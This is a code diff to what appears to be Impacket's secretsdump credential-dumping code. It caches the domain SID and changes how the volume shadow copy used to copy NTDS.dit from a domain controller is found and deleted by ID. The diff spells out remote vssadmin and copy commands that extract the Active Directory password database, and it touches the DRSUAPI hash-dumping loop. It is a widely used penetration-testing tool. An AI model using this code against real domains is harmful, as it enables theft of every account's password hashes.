@@ -356,6 +356,7 @@ class RemoteOperations:
         self.__samr = None
         self.__domainHandle = None
         self.__domainName = None
+        self.__domainSid = None
 
         self.__drsr = None
         self.__hDrs = None
@@ -409,6 +410,8 @@ class RemoteOperations:
         serverHandle = resp['ServerHandle']
 
         resp = samr.hSamrLookupDomainInSamServer(self.__samr, serverHandle, domain)
+        self.__domainSid = resp['DomainId'].formatCanonical()
+
         resp = samr.hSamrOpenDomain(self.__samr, serverHandle=serverHandle, domainId=resp['DomainId'])
         self.__domainHandle = resp['DomainHandle']
         self.__domainName = domain
@@ -569,11 +572,14 @@ class RemoteOperations:
             resp = e.get_packet()
         return resp
 
-    def ridToSid(self, rid):
+    def getDomainSid(self):
+        if self.__domainSid is not None:
+            return self.__domainSid
+
         if self.__samr is None:
             self.connectSamr(self.getMachineNameAndDomain()[1])
-        resp = samr.hSamrRidToSid(self.__samr, self.__domainHandle , rid)
-        return resp['Sid']
+
+        return self.__domainSid
 
     def getMachineKerberosSalt(self):
         """
@@ -936,8 +942,12 @@ class RemoteOperations:
     def __answer(self, data):
         self.__answerTMP += data
 
-    def __getLastVSS(self):
-        self.__executeRemote('%COMSPEC% /C vssadmin list shadows')
+    def __getLastVSS(self, forDrive=None):
+        if forDrive:
+            command = '%COMSPEC% /C vssadmin list shadows /for=' + forDrive
+        else:
+            command = '%COMSPEC% /C vssadmin list shadows'
+        self.__executeRemote(command)
         time.sleep(5)
         tries = 0
         while True:
@@ -959,21 +969,28 @@ class RemoteOperations:
         lines = self.__answerTMP.split(b'\n')
         lastShadow = b''
         lastShadowFor = b''
+        lastShadowId = b''
 
         # Let's find the last one
         # The string used to search the shadow for drive. Wondering what happens
         # in other languages
         SHADOWFOR = b'Volume: ('
+        IDSTART = b'Shadow Copy ID: {'
+        IDLEN=len('3547017b-0ac9-478b-88e6-f9be7e1c11999')
 
         for line in lines:
            if line.find(b'GLOBALROOT') > 0:
                lastShadow = line[line.find(b'\\\\?'):][:-1]
            elif line.find(SHADOWFOR) > 0:
                lastShadowFor = line[line.find(SHADOWFOR)+len(SHADOWFOR):][:2]
+           elif line.find(IDSTART) > 0:
+               lastShadowId = line[line.find(IDSTART)+len(IDSTART):][:IDLEN-1]
 
         self.__smbConnection.deleteFile('ADMIN$', 'Temp\\__output')
 
-        return lastShadow.decode('utf-8'), lastShadowFor.decode('utf-8')
+        LOG.debug('__getLastVSS found last VSS %s on %s with ID of %s' % (lastShadow.decode('utf-8'), lastShadowFor.decode('utf-8'), lastShadowId.decode('utf-8')))
+
+        return lastShadow.decode('utf-8'), lastShadowFor.decode('utf-8'), lastShadowId.decode('utf-8')
 
     def saveNTDS(self):
         LOG.info('Searching for NTDS.dit')
@@ -1001,15 +1018,16 @@ class RemoteOperations:
         LOG.info('Registry says NTDS.dit is at %s. Calling vssadmin to get a copy. This might take some time' % ntdsLocation)
         LOG.info('Using %s method for remote execution' % self.__execMethod)
         # Get the list of remote shadows
-        shadow, shadowFor = self.__getLastVSS()
+        shadow, shadowFor, shadowId = self.__getLastVSS(forDrive=ntdsDrive)
         if shadow == '' or (shadow != '' and shadowFor != ntdsDrive):
             # No shadow, create one
             self.__executeRemote('%%COMSPEC%% /C vssadmin create shadow /For=%s' % ntdsDrive)
-            shadow, shadowFor = self.__getLastVSS()
+            shadow, shadowFor, shadowId = self.__getLastVSS(forDrive=ntdsDrive)
             shouldRemove = True
-            if shadow == '':
+            if shadow == '' or shadowFor != ntdsDrive:
                 raise Exception('Could not get a VSS')
         else:
+            # There was already a shadow, let's not delete this
             shouldRemove = False
 
         # Now copy the ntds.dit to the temp directory
@@ -1018,7 +1036,9 @@ class RemoteOperations:
         self.__executeRemote('%%COMSPEC%% /C copy %s%s %%SYSTEMROOT%%\\Temp\\%s' % (shadow, ntdsLocation[2:], tmpFileName))
 
         if shouldRemove is True:
-            self.__executeRemote('%%COMSPEC%% /C vssadmin delete shadows /For=%s /Quiet' % ntdsDrive)
+            LOG.debug('Trying to delete shadow copy using command : %%COMSPEC%% /C vssadmin delete shadows /shadow="{%s}" /Quiet' % shadowId)
+            self.__executeRemote('%%COMSPEC%% /C vssadmin delete shadows /shadow="{%s}" /Quiet' % shadowId)
+
 
         tries = 0
         while True:
@@ -1073,6 +1093,7 @@ class CryptoCommon:
             plainText += aes256.decrypt(cipherBuffer)
 
         return plainText
+
 
 class OfflineRegistry:
     def __init__(self, hiveFile = None, isRemote = False):
@@ -2457,15 +2478,15 @@ class NTDSHashes:
                         for user in resp['Buffer']['Buffer']:
                             userName = user['Name']
 
-                            userSid = self.__remoteOps.ridToSid(user['RelativeId'])
+                            userSid = "%s-%i" % (self.__remoteOps.getDomainSid(), user['RelativeId'])
                             if resumeSid is not None:
                                 # Means we're looking for a SID before start processing back again
-                                if resumeSid == userSid.formatCanonical():
+                                if resumeSid == userSid:
                                     # Match!, next round we will back processing
-                                    LOG.debug('resumeSid %s reached! processing users from now on' % userSid.formatCanonical())
+                                    LOG.debug('resumeSid %s reached! processing users from now on' % userSid)
                                     resumeSid = None
                                 else:
-                                    LOG.debug('Skipping SID %s since it was processed already' % userSid.formatCanonical())
+                                    LOG.debug('Skipping SID %s since it was processed already' % userSid)
                                 continue
 
                             # Let's crack the user sid into DS_FQDN_1779_NAME
@@ -2474,7 +2495,7 @@ class NTDSHashes:
                             # For some reason tho, I get ERROR_DS_DRA_BAD_DN when doing so.
                             crackedName = self.__remoteOps.DRSCrackNames(drsuapi.DS_NAME_FORMAT.DS_SID_OR_SID_HISTORY_NAME,
                                                                          drsuapi.DS_NAME_FORMAT.DS_UNIQUE_ID_NAME,
-                                                                         name=userSid.formatCanonical())
+                                                                         name=userSid)
 
                             if crackedName['pmsgOut']['V1']['pResult']['cItems'] == 1:
                                 if crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['status'] != 0:
@@ -2504,7 +2525,7 @@ class NTDSHashes:
                                 LOG.error(str(e))
 
                             # Saving the session state
-                            self.__resumeSession.writeResumeData(userSid.formatCanonical())
+                            self.__resumeSession.writeResumeData(userSid)
 
                         enumerationContext = resp['EnumerationContext']
                         status = resp['ErrorCode']
